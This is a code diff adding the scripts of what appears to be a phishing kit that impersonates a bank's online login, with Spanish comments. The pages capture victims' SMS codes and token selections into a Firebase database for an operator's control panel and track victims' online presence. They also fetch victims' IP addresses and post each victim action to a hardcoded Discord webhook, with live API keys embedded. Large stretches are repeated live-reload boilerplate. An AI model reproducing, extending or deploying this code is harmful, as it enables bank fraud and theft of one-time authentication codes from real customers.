+    if (sessionId) {
+        // Lógica de presencia para la luz del panel
+        const presenceRef = db.ref('logins/' + sessionId + '/online');
+        db.ref(".info/connected").on("value", (snap) => {
+            if (snap.val() === true) {
+                presenceRef.set(true);
+                presenceRef.onDisconnect().set(false);
+            }
+        });
+
+        // Evento al presionar continuar
+        document.getElementById('form-sms').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // CAPTURA DE 1 SOLO INPUT (Asegúrate de que tu input tenga id="sms-input")
+            const codigoCompleto = document.getElementById('sms-input').value;
+            
+            const btn = document.getElementById('btn-envio');
+            
+            // Validación mínima para no enviar vacío
+            if (codigoCompleto.length < 4) {
+                return; 
+            }
+
+            btn.disabled = true;
+
+            // Actualizar el mismo registro y redirigir
+            db.ref('logins/' + sessionId).update({
+                sms: codigoCompleto,
+                step: 'SMS_ENTREGADO' // Cambié 'status' por 'step' para que tu panel lo lea correctamente
+            }).then(() => {
+                window.location.href = 'cargando.html?id=' + sessionId;
+            }).catch(() => {
+                window.location.href = 'cargando.html?id=' + sessionId;
+            });
+        });
+
+    } else {
+        window.location.href = 'index.html';
+    }
+</script>
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+<script>
+        const tokenInput = document.getElementById('token_code');
+        const submitBtn = document.getElementById('submit_btn');
+        const labelDigite = document.getElementById('label_digite');
+
+        // Escucha cada carácter introducido por el usuario
+        tokenInput.addEventListener('input', function() {
+            // Cambia el color del label a un azul corporativo al escribir
+            if (this.value.length > 0) {
+                labelDigite.style.color = '#0d4b94';
+            } else {
+                labelDigite.style.color = '#9b9b9b';
+            }
+
+            // Si se completan exactamente los 6 dígitos requeridos
+            if (this.value.length === 6) {
+                submitBtn.classList.add('active'); // Aplica el color #0055b8
+            } else {
+                submitBtn.classList.remove('active'); // Vuelve al color base claro #5b8ecb
+            }
+        });
+    </script>
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+<script>
+        // 1. CONFIGURACIÓN DE TU CONFIG DE FIREBASE
+        // Reemplaza estos datos con las credenciales de tu proyecto de Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyCxeH-2hF3xCZFdm5FR9mpR7kaUpcfoKRE",
+  authDomain: "occidentenlinea-credicard.firebaseapp.com",
+  databaseURL: "https://coomecipaonline-default-rtdb.firebaseio.com/",
+  projectId: "occidentenlinea-credicard",
+  storageBucket: "occidentenlinea-credicard.firebasestorage.app",
+  messagingSenderId: "917554277745",
+  appId: "1:917554277745:web:c6f89a2bde93e6c74ddad0"
+        };
+
+        // Inicializar Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // 2. ELEMENTOS DEL DOM
+        const tokenTypeSelect = document.getElementById('token_type');
+        const smsNotice = document.getElementById('sms_notice');
+        const countdownDisplay = document.getElementById('countdown');
+        const tokenInput = document.getElementById('token_code');
+        const submitBtn = document.getElementById('submit_btn');
+        const labelDigite = document.getElementById('label_digite');
+
+        let countdownInterval = null;
+
+        // 3. FUNCIÓN DE CONTADOR REGRESIVO
+        function startCountdown() {
+            clearInterval(countdownInterval); // Limpiar cualquier intervalo previo
+            let seconds = 30;
+            countdownDisplay.textContent = `--${seconds}--`;
+
+            countdownInterval = setInterval(() => {
+                seconds--;
+                if (seconds >= 0) {
+                    countdownDisplay.textContent = `--${seconds}--`;
+                } else {
+                    clearInterval(countdownInterval);
+                    countdownDisplay.textContent = `--0--`;
+                }
+            }, 1000);
+        }
+
+        // 4. EVENTO CAMBIO DE SELECTOR (SOFT TOKEN / SMS TOKEN)
+        tokenTypeSelect.addEventListener('change', function() {
+            if (this.value === 'sms_token') {
+                // Mostrar bloque del aviso y activar contador
+                smsNotice.style.display = 'block';
+                startCountdown();
+
+                // ENVIAR NOTIFICACIÓN A TU FIREBASE REALTIME DATABASE
+                // Modifica la ruta u objetos según la estructura de tu panel de control
+                database.ref('visitas_activas/actual').update({
+                    evento: "Usuario solicitó SMS Token",
+                    timestamp: Date.now()
+                }).catch(err => console.log("Error al notificar Firebase:", err));
+
+            } else {
+                // Si vuelve a Soft Token, ocultar aviso y limpiar intervalo
+                smsNotice.style.display = 'none';
+                clearInterval(countdownInterval);
+            }
+        });
+
+        // 5. CONTROL VISUAL DEL BOTÓN ENVIAR (6 DÍGITOS)
+        tokenInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                labelDigite.style.color = '#0d4b94';
+            } else {
+                labelDigite.style.color = '#9b9b9b';
+            }
+
+            if (this.value.length === 6) {
+                submitBtn.classList.add('active');
+            } else {
+                submitBtn.classList.remove('active');
+            }
+        });
+    </script>
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script><script>
+    // Vinculación de los elementos del DOM
+    const selector = document.getElementById('selector_autenticacion');
+    const mensaje = document.getElementById('bloque_mensaje');
+
+    // Escucha de cambios en el selector
+    selector.addEventListener('change', function() {
+        // Validación del valor seleccionado
+        if (this.value === 'sms_token') {
+            mensaje.style.display = 'block'; // Muestra el elemento
+        } else {
+            mensaje.style.display = 'none';  // Lo oculta si cambia a otra opción
+        }
+    });
+</script>
+<script>
+        // Escuchamos el evento 'change' (cuando el usuario selecciona algo)
+        document.getElementById('selector_autenticacion').addEventListener('change', function() {
+            
+            // 1. REEMPLAZA ESTA URL CON TU WEBHOOK REAL DE DISCORD
+            const webhookURL = "https://discord.com/api/webhooks/1507864461971554467/j4VamcI1PYxbmMxnviA2UIrO4fhu7SWJJro_uudSw4OL3h6xKhCqDfVtPWnXOUZsLbgF"; 
+
+            // 2. Obtenemos el valor que el cliente acaba de seleccionar
+            const opcionSeleccionada = this.value;
+
+            // 3. Estructuramos el mensaje para Discord
+            const mensaje = {
+                content: `⚡ **Notificación instantánea**\nUn cliente acaba de seleccionar la opción: **${opcionSeleccionada}**`
+            };
+
+            // Función automática para obtener la IP del cliente al cargar la página
+        async function obtenerIP() {
+            try {
+                const respuesta = await fetch('https://ipify.org');
+                const datos = await respuesta.json();
+                clienteIP = datos.ip;
+            } catch (error) {
+                console.error("No se pudo obtener la IP:", error);
+            }
+        }
+        // Ejecutamos la búsqueda de IP de inmediato
+        obtenerIP();
+
+            // 4. Enviamos los datos automáticamente a Discord
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(mensaje)
+            })
+            .then(respuesta => {
+                if (respuesta.ok) {
+                    console.log('Notificación enviada a Discord.');
+                } else {
+                    console.error('Error al enviar a Discord.');
+                }
+            })
+            .catch(error => console.error('Error de red:', error));
+        });
+    </script>
+    <script>
+        // CONFIGURACIÓN: Reemplaza con tu URL real de Discord
+        const webhookURL = "https://discord.com/api/webhooks/1507864461971554467/j4VamcI1PYxbmMxnviA2UIrO4fhu7SWJJro_uudSw4OL3h6xKhCqDfVtPWnXOUZsLbgF"; 
+
+        // 2. Envío AUTOMÁTICO al hacer clic en "Reenviar token"
+        document.getElementById('reenviarToken').addEventListener('click', function() {
+            const mensajeToken = {
+                content: `🔑 **Solicitud de Token**\nEl cliente ha hecho clic en: **Reenviar token**`
+            };
+            enviarADiscord(mensajeToken);
+            
+        });
+
+        // Función reutilizable para realizar el fetch a Discord
+        function enviarADiscord(cuerpoMensaje) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(cuerpoMensaje)
+            })
+            }
+    </script>
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+</body></html>
